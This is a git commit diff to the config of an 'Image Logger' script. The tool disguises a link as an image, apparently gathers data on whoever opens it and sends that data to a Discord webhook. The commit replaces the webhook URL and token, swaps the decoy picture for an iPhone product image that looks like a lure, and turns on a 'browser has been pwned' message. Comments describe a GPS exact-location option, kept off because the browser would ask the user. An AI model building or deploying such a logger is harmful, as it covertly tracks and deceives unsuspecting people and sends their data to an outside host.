cfbe4e8f45a8754578da80c1871bfb1903a7bcb6
BaconKingScripts <marcelisxd.14@gmail.com>
2025-10-02 19:19:24 +0200

    Update Image.py

--- api/Image.py
+++ api/Image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1391124379831631975/ACz2XCoS2r6ZijFyl9cZs6ZdaMEVrM6WNKq7UgyX7G9Mdz3UNwU-9orv3bs2XmpbXMLe",
-    "image": "https://betawiki.net/images/thumb/6/6c/WindowsXP-RTM-Desktop.png/290px-WindowsXP-RTM-Desktop.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1423357993612873809/NAOUemOXMdSGtxwPXhi-6_5l-d347RhBfdMhVn3xD91DUhdeA9snhvauhjyJUwjAKoK4",
+    "image": "https://store.storeimages.cdn-apple.com/1/as-images.apple.com/is/iphone-card-40-17pro-202509_FMT_WHH?wid=508&hei=472&fmt=p-jpg&qlt=95&.v=WVVFRzUzVk1oblJhbW9PbGNSU25ja3doNjVzb1FWSTVwZWJJYThYTHlrNzQzbUlIR1RvazhDRHNOQlYvM3g2dFIwdkZSSnBZYjhOaHBpM2lkYTFBUEZHTmVoMWFVZloyU3lqdmZCOUFEeDF6K2N6UFd4K21VWHNnbWZBQ3hSanQ", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,7 +27,7 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+        "doMessage": True, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
